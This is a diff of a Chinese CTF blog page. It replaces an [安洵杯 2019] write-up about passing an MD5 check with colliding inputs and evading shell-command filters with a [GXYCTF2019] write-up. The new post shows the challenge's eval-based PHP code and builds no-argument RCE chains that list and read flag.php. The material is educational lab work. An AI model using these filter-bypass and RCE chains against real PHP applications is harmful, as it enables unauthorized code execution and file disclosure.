@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="同时绕过强制类型和MD5, Keep-Boom">
+    <meta name="keywords" content="无参RCE, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>同时绕过强制类型和MD5 | Keep-Boom</title>
+    <title>无参RCE | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">同时绕过强制类型和MD5</h1>
+                    <h1 class="description center-align post-title">无参RCE</h1>
                 </div>
             </div>
         </div>
@@ -459,19 +459,69 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="安洵杯-2019-web题-easy-web"><a href="#安洵杯-2019-web题-easy-web" class="headerlink" title="[安洵杯 2019] web题-easy_web"></a>[安洵杯 2019] web题-easy_web</h3><p>知识点：</p>
-<p>MD5强绕过</p>
-<p>shell的绕过方式</p>
-<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
-
-b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
-<pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
-        echo `$cmd`;
-    &#125;     “`”表示执行shell命令</code></pre>
-<p>数组可以绕过MD5，但绕不过前面的强制类型转换，上面的方法是大佬想出来的，没看懂为啥。。。</p>
-<p>#过滤了ls 但可以用dir</p>
-<p>#过滤了cat 可以使用 ca\t 绕过或者 sort /flag</p>
-<p>在shell命令里可以加\不影响执行</p>
+                <h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>知识点：</p>
+<p>#.git泄露</p>
+<p>#无参RCE</p>
+<p>函数知识：</p>
+<pre><code>localeconv() 函数返回一包含本地数字及货币格式信息的数组，数组第一项就是`.`。
+scandir() 列出指定目录中的文件和目录。
+readfile() 输出一个文件。
+current() 返回数组中的当前单元, 默认取第一个值。
+pos() current() 的别名。
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+array_reverse()以相反的元素顺序返回数组。
+highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。
+print_r 打印变量和var_dump类似但又有不同。</code></pre>
+<h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="#0x01解题"></a>#0x01解题</h3><p>用dirmap扫描发现.git猜测是git文件泄露，再使用Git_Extract扫描。进行内容读取。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>
+                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+            <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<pre><code>#（?R)引用当前正则表达式，就是[a-z,_]+\((?R)?\)，就会递归下去，只能存在a(b(c(d())))这样的，不允许b(a(&#39;1&#39;))这样的。</code></pre>
+<p>#第一步读取目录</p>
+<pre><code>print_r(scandir(&#39;.&#39;));</code></pre>
+<p>但中间的’.’不能输入进去，但localeconv()返回的数组第一个值就是.</p>
+<p>current() 返回数组中的当前单元, 默认取第一个值。&lt;==&gt; pos()</p>
+<p>构造</p>
+<pre><code>print_r(scandir(current(localeconv())));
+print_r(scandir(pos(localeconv())));</code></pre>
+<p><img src="/images/41.png"></p>
+<p>#发现flag.php尝试读取。</p>
+<p>array_reverse()以相反的元素顺序返回数组。</p>
+<p>next() 函数将内部指针指向数组中的下一个元素，并输出。</p>
+<p>构造</p>
+<pre><code>print_r(next(array_reverse(scandir(current(localeconv())))));</code></pre>
+<p><img src="/images/42.png"></p>
+<p>#如何读取呢？</p>
+<pre><code>file_get_contents()
+readfile()
+highlight_file()
+show_source()</code></pre>
+<pre><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>
+<p>大佬的玄学方法：</p>
+<p><img src="/images/43.png"></p>
+<h4 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109483019?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161649970116780271570302%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161649970116780271570302&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-109483019.pc_search_result_cache&amp;utm_term=%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">https://blog.csdn.net/EC_Carrot/article/details/109483019?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161649970116780271570302%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161649970116780271570302&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-109483019.pc_search_result_cache&amp;utm_term=%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83</a></p>
 
             </div>
             <hr/>
@@ -497,7 +547,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/">http://example.com/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/</a>
+                    <a href="http://example.com/2021/03/23/%E6%97%A0%E5%8F%82RCE/">http://example.com/2021/03/23/%E6%97%A0%E5%8F%82RCE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -702,9 +752,10 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/23/%E6%97%A0%E5%8F%82RCE/">
                     <div class="card-image">
@@ -722,9 +773,9 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -733,6 +784,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -743,13 +795,13 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">
+                <a href="/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="从一道题目浅谈SSTi">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="同时绕过强制类型和MD5">
                         
-                        <span class="card-title">从一道题目浅谈SSTi</span>
+                        <span class="card-title">同时绕过强制类型和MD5</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -760,7 +812,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
                             </span>
                         <span class="publish-author">
                             
